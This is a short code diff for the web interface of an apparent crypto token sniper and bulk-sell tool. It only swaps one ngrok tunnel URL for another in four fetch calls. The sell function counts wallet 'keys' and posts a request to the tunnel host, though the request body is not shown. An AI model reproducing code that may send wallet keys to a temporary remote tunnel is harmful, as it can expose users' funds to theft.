@@ -329,7 +329,7 @@
             statusElement.innerHTML = "Processing sell request for " + keys.length + " wallets...";
             
             try {
-                const response = await fetch("https://b0e5-95-46-155-37.ngrok-free.app/api/tokens/sell-bundle", {
+                const response = await fetch("https://c16f-95-46-155-209.ngrok-free.app/api/tokens/sell-bundle", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ 
@@ -396,7 +396,7 @@
             statusElement.innerHTML = "Starting token sniper...";
             
             try {
-                const response = await fetch("https://b0e5-95-46-155-37.ngrok-free.app/api/tokens/sniper/start", {
+                const response = await fetch("https://c16f-95-46-155-209.ngrok-free.app/api/tokens/sniper/start", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ 
@@ -440,7 +440,7 @@
             statusElement.innerHTML = "Stopping token sniper...";
             
             try {
-                const response = await fetch("https://b0e5-95-46-155-37.ngrok-free.app/api/tokens/sniper/stop", {
+                const response = await fetch("https://c16f-95-46-155-209.ngrok-free.app/api/tokens/sniper/stop", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" }
                 });
@@ -472,7 +472,7 @@
             }
             
             try {
-                const response = await fetch("https://b0e5-95-46-155-37.ngrok-free.app/api/tokens/sniper/status");
+                const response = await fetch("https://c16f-95-46-155-209.ngrok-free.app/api/tokens/sniper/status");
                 const data = await response.json();
                 
                 if (!data.active) {
